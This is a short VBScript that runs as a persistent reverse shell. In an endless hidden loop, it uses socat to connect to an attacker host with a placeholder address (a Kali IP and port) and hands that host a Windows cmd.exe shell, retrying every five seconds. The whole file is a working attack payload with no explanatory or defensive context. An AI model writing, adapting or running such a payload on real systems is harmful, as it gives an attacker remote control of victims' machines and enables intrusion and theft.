Set objShell = CreateObject("wscript.Shell")

Do
    ' Replace <Kali-IP> with your IP address and <Port> with your desired port number
    objShell.Run "cmd.exe /c socat.exe TCP:<Kali-IP>:<Port> EXEC:cmd.exe,pipes", 0, True
    WScript.Sleep 5000 ' Wait for 5 seconds before retrying
Loop